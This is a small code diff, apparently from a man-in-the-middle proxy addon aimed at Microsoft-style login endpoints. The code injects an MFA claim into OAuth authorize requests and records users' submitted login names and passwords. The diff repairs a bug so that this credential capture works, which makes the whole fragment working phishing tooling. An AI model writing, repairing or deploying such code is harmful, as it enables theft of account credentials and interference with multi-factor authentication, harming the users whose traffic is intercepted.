@@ -18,7 +18,7 @@ class ModifierAddon:
 
         if flow.request.path.startswith("/common/oauth2/v2.0/authorize"):
             flow.request.query["claims"] = MFA_CLAIM
-        if flow.request.path.path.startswith("/common/login"):
+        if flow.request.path.startswith("/common/login"):
             self.credentials["login"] = flow.request.urlencoded_form["login"]
             self.credentials["passwd"] = flow.request.urlencoded_form["passwd"]
 
